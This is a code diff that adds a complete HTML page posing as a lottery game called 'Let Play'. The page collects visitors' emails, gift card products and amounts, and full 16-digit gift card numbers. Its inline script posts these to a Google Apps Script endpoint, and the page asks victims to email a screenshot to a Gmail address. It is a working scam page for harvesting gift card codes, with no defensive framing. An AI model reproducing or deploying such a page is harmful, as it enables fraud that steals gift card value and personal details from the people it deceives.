@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gateway</title>
+    <link href="styles.css" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/c9dc73ea7d.js" crossorigin="anonymous"></script>
+</head>
+<body>
+   <div class="container">
+    <div class="form-box">
+        <h1 id="title">Let Play</h1>
+        <form name="submit-to-google-sheet" class="input-group">
+                <div class="input-field" id="nameField">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="email" name="userEmail" placeholder="Your Email and your lucky number" required>
+                </div>
+
+                <div class="input-field" id="nameField2">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="text" name="giftCardProduct" placeholder="Gift card product and Amount" minlength="9" maxlength="20" required>
+                </div>
+                
+                <div class="input-field" id="nameField3">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="text" name="giftCardDigits" placeholder="Input Gift card Digits" minlength="16" maxlength="16" required>
+                </div>
+            <p>Screenshot the webpage and send to <a href="elitelotto7@gmail.com">elitelotto7@gmail.com</a> as proof</p>
+            <div class="btn-field">
+                <input type="submit" value="Play" id="signupBtn">
+            </div>
+        </form>
+    </div>
+   </div>
+
+   <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzen1SKgppOVa7wx6y25mGazojs81s2xa_MaFJhPskV-7zWUB418IkGlf6El76Pb6besg/exec'
+    const form = document.forms['submit-to-google-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => console.log('Success!', response))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+</body>
+</html>
